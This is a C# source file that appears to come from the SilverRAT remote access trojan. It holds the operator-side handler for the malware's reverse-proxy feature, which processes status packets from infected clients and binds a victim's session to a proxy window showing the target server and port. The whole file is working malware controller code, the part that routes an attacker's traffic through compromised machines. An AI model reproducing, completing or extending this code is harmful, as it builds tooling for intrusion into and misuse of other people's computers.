using SilverRAT.Connection;
using SilverRAT.Forms;
using SilverRAT.MessagePack;
using System.Drawing;
using System.Windows.Forms;

namespace SilverRAT.SilverRAT.Handle_Packet;

public class HandleReverseProxy
{
    public void Connect(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "Data":
                    {
                        ReversePeoxy reversePeoxy4 = (ReversePeoxy)Application.OpenForms["ReverseProxy:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (reversePeoxy4 != null)
                        {
                            reversePeoxy4.TargetServer.Text = unpack_msgpack.ForcePathObject("TargetServer").GetAsString();
                            reversePeoxy4.TargetPort.Text = unpack_msgpack.ForcePathObject("TargetPort").GetAsString() + " / HTTP";
                        }
                        break;
                    }
                case "Disconnected":
                    {
                        ReversePeoxy reversePeoxy3 = (ReversePeoxy)Application.OpenForms["ReverseProxy:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (reversePeoxy3 != null)
                        {
                            bool enabled2 = bool.Parse(unpack_msgpack.ForcePathObject("IsConnect").GetAsString());
                            string asString = unpack_msgpack.ForcePathObject("Port").GetAsString();
                            reversePeoxy3.ConectAndDisconnect.Text = "Connect";
                            reversePeoxy3.ConectAndDisconnect.Enabled = enabled2;
                            reversePeoxy3.LabelPort.Text = asString;
                            reversePeoxy3.LabelPort.ForeColor = Color.DarkRed;
                        }
                        break;
                    }
                case "Connected":
                    {
                        ReversePeoxy reversePeoxy2 = (ReversePeoxy)Application.OpenForms["ReverseProxy:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (reversePeoxy2 != null)
                        {
                            bool enabled = bool.Parse(unpack_msgpack.ForcePathObject("IsConnect").GetAsString());
                            reversePeoxy2.LabelPort.Text = "127.0.0.1:" + unpack_msgpack.ForcePathObject("Port").GetAsString();
                            reversePeoxy2.ConectAndDisconnect.Text = "Disconnect";
                            reversePeoxy2.ConectAndDisconnect.Enabled = enabled;
                            reversePeoxy2.LabelPort.ForeColor = Color.LimeGreen;
                        }
                        break;
                    }
                case "Actived":
                    {
                        ReversePeoxy reversePeoxy = (ReversePeoxy)Application.OpenForms["ReverseProxy:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (reversePeoxy != null)
                        {
                            if (reversePeoxy.Client == null)
                            {
                                reversePeoxy.Client = client;
                                reversePeoxy.LoaderConnect.Visible = false;
                                reversePeoxy.ConectAndDisconnect.Enabled = true;
                                reversePeoxy.timer1.Start();
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
            }
        }
        catch
        {
        }
    }
}
